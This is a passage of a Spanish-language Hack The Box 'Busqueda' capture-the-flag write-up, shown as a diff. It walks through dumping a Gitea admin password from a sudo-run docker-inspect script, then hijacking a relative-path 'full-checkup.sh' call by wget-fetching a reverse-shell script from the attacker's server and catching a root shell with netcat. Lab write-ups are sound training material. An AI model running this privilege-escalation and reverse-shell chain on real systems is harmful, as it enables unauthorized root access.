@@ -34,6 +34,33 @@ HACK THE BOX - BUSQUEDA MACHINE
 - sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect                                               -Al correr el comando, nos pide seguir el siguiente formato: Usage: /opt/scripts/system-checkup.py docker-inspect <format> <container_name>, por lo que tenemos el nombre de Container, anteriormente visto de la salida de docker-ps, a lo que nos faltaria el argumento <format>, googleamos docker-inspect en google y el formato de ingreso a lo que encontramos que podemos usar una salida 
 - sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect --format='{{json .Config}}' 960873171e2e      -Ingresamos los argumentos el formato y el conteiner a lo que recibimos informacion importante y encontramos credenciales de la database: GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh"
 
-            -Con la pass ingresada, ingresamos a gitea.searcher.htb, y nos logueamos como "administrator:yuiu1hoiu4i5ho1uh"
+            -Con la pass ingresada, ingresamos a gitea.searcher.htb, y nos logueamos como "administrator:yuiu1hoiu4i5ho1uh", dentro podemos ver que tenemos acceso al codigo fuente de las scripts alojadas en /opt/scripts/system-checkup.py, y nos damos cuenta que "full-checkup" ejecuta "./full-checkup.sh" por lo que ejecutamos: 
 
-- 
+- sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup                                                 -Nos da como resultado una serie de informacion sobre los contenedores, como metodo de prueba ejecutamos el comando desde otra ruta que no sea en la que se encuentra el ejecutable "Full-checkup"
+- cd ..
+- sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup                                                 -Tenemos como resultado  "Something went wrong", lo que podemos explotar, usando un archivo reemplazo con el vulneremos el sistema.
+- cd /tmp/
+
+    (Desde nuestra maquina)
+- vi full-checkup.sh                                                                                                -Creamos un archivo y usamos la pagina revshell.com para generar una conexion RSC con python3, guardamos y luego ejectuamos un servidor en nuestro directorio
+- sudo python3 -m http.server 80
+
+    (Target Machine)
+- wget http://10.10.14.43:80/full-checkup.sh                                                                        -En el directorio tmp, ejecutamos el wget y descargamos el archivo a ejectuar
+- chmod +x full-checkup.sh                                                                                          -Le concedemos permisos de ejecución y posteriormente ejecutamos el comando netcat
+
+    (Desde nuestra maquina)
+- nc -lvnp 4444                                                                                                     -Abrimos un listener con netcat para recibir la reverse shell
+
+    (Target Machine)
+- sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup                                                 -Ejecutamos el comando y nos damos cuenta que toma nuestro archivo full-checkup de modo que se establece la reverse shell.
+
+    (En nuestra maquina)
+- su root                                                                                                           -Ya tenemos acceso como usuario root
+- cat root.txt                                                                                                      -FLAG root 
+- cd /home/svc                                                                                                  
+- cat user.txt                                                                                                      -FLAG user
+
+
+
+        MAQUINA TERMINADA
